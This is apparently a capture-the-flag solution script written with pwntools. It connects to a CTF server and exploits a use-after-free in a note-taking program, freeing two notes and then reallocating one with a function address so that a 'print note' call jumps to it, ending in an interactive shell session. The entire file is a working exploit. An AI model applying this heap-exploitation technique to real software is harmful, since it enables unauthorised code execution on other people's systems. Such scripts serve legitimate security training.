#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10137)

def add_note(sz, data):
    r.sendafter(':', '1')
    r.sendafter(':', str(sz))
    r.sendafter(':', str(data))

def del_note(idx):
    r.sendafter(':', '2')
    r.sendafter(':', str(idx))

def print_note(idx):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx))

addr = 0x400c23

add_note(40, 'lala')
add_note(40, 'gaga')
del_note(0)
del_note(1)
add_note(16, p64(addr))
print_note(0)

r.interactive()
